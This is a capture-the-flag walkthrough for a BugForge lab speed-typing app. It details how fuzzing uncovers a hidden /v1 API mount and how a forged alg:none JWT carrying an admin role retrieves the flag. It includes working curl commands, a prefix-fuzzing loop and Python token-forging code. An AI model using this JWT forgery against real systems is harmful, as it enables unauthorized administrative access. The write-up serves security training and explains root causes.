# sokudo-003 - BugForge Lab Walkthrough

**URL:** https://lab-1784727488944-humta0.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** Shadow API Mount with Inconsistent JWT Algorithm Verification
**Flag:** `bug{xT5vCK8QON7G4ZO4ZHwKqyq7Zzrphd0P}`

---

## Summary

Sokudo is a speed-typing SPA (same app family as prior Sokudo labs). The React frontend calls
every API route under `/v2/*` (login, register, verify-token, session/start, session/submit,
stats, stats/leaderboard, admin/flag, admin/sessions, admin/users), all confirmed by reading the
route strings out of the webpack bundle. Fuzzing bare API prefixes directly against the server,
independent of what the bundle references, turns up a second live route table mounted at `/v1/*`
with the exact same endpoints and backing database. Both mounts enforce the same mass-assignment
guard on register and session/submit (a client-supplied `role` field is silently dropped on
either mount), so that avenue is a dead end here. The real divergence is in JWT verification: the
`/v2` mount's auth middleware correctly rejects a token signed with `alg: none`, but the `/v1`
mount's middleware does not. Forging a header/payload pair with `alg: none`, `role: admin`, and an
empty signature against `/v1/admin/flag` returns the flag directly, while the identical token
against `/v2/admin/flag` is rejected.

## Tech Stack

- Frontend: React SPA (CRA)
- Backend: Express.js, SQLite
- Auth: JWT (HS256), duplicated route mount at `/v1` and `/v2`

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /v2/register` | none | returns JWT directly, no login step needed |
| `GET /v1/stats`, `/v1/verify-token`, etc. | Bearer | undocumented duplicate of every `/v2` route |
| `GET /v1/admin/flag` | Bearer, admin role | vulnerable sink, weaker JWT verification than `/v2` |
| `GET /v2/admin/flag` | Bearer, admin role | correctly rejects `alg: none` |

## Attack Chain

### Step 1 - Read the JS bundle for real routes

```bash
curl -s $TARGET/static/js/main.99173f1b.js -o main.js
grep -oE '"/[a-zA-Z0-9_/-]*"' main.js | sort -u
```

Every route string found is prefixed `/v2/` (login, register, verify-token, session/start,
session/submit, stats, stats/leaderboard, admin/flag, admin/sessions, admin/users). No other
prefix appears anywhere in the frontend code.

### Step 2 - Register and grab a token

```bash
curl -s -X POST $TARGET/v2/register -H "Content-Type: application/json" \
  -d '{"username":"pentest_r1","password":"Passw0rd!23","email":"pentest_r1@example.com"}'
```

Returns a normal HS256 JWT with `{"id":4,"username":"pentest_r1","role":"user"}`.

### Step 3 - Fuzz bare prefixes for a shadow mount

```bash
for prefix in /api /api/v1 /api/v2 /v1 /v3 /rest /internal /internal/api /legacy /old /backend; do
  curl -s -o /dev/null -w "%{content_type}|%{http_code}  $prefix/stats\n" \
    "$TARGET$prefix/stats" -H "Authorization: Bearer $TOKEN"
done
```

`/v1/stats` comes back `application/json` while every other guessed prefix returns the SPA
fallback (`text/html`). Re-running every known `/v2` route path against `/v1` confirms a full
duplicate route table, including `/v1/admin/flag` returning `403 {"error":"Admin access
required"}` for a normal user token (route exists, role-gated).

### Step 4 - Rule out mass assignment (dead end here)

```bash
curl -s -X POST $TARGET/v2/register -H "Content-Type: application/json" \
  -d '{"username":"x","password":"Passw0rd!23","email":"x@example.com","role":"admin"}'
curl -s -X POST $TARGET/v1/register -H "Content-Type: application/json" \
  -d '{"username":"y","password":"Passw0rd!23","email":"y@example.com","role":"admin"}'
```

Both accounts come back with `"role":"user"` regardless of mount. Injecting a `wpm` override into
`POST .../session/submit` is also ignored identically on both mounts, since `wpm` is always
recomputed server-side from `duration`/`textGenerated`/`userInput`. The two mounts are not
distinguished by input validation on writes.

### Step 5 - Forge an alg:none token and hit the shadow mount's admin route

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"id": 1, "username": "admin", "role": "admin", "iat": 1784727562}
token = f"{b64url(header)}.{b64url(payload)}."
```

```bash
curl -s $TARGET/v2/admin/flag -H "Authorization: Bearer $TOKEN"
# -> {"error":"Invalid token"}

curl -s $TARGET/v1/admin/flag -H "Authorization: Bearer $TOKEN"
# -> {"flag":"bug{xT5vCK8QON7G4ZO4ZHwKqyq7Zzrphd0P}"}
```

The `/v2` mount's JWT middleware validates the algorithm and rejects the unsigned token outright.
The `/v1` mount's middleware decodes the token without enforcing the expected algorithm, accepts
the forged `role: admin` claim, and returns the flag.

## Dead Ends

| Attempt | Result | Lesson |
|---|---|---|
| `role: admin` on `/v2/register` and `/v1/register` | both silently coerced to `"user"` | mass-assignment guard is applied identically on both mounts, not the differentiator this time |
| `wpm` override on `session/submit` on either mount | ignored, server always recomputes | stat write endpoints from earlier Sokudo labs are properly closed here |
| PUT/PATCH/POST on `/v1/profile`, `/v2/profile` | 404, route does not exist in this app at all | this Sokudo variant has no profile-write endpoint to mass-assign into, unlike other Sokudo labs |

## Root Causes

- The Express app registers the identical router twice, once at `/v2` (the mount the frontend
  actually uses) and once at `/v1` (never referenced anywhere in the shipped frontend bundle).
- The two mounts differ only in how strictly their JWT-verification middleware checks the token's
  algorithm. `/v2`'s middleware enforces the expected `alg` (HS256) and rejects `none`. `/v1`'s
  middleware accepts the token regardless of `alg`, trusting the payload claims as-is.
- Because role is read straight from the (unverified, on `/v1`) JWT payload rather than being
  looked up fresh from the database, a forged claim is sufficient with no valid signature at all.

## CWE / OWASP

- **CWE-347**: Improper Verification of Cryptographic Signature (`alg: none` acceptance)
- **CWE-1059**-adjacent: duplicate/undocumented interface with inconsistent security controls
- **OWASP A01:2021** - Broken Access Control / **OWASP API9:2023** - Improper Inventory Management
  (an entire undocumented API mount reachable in production)
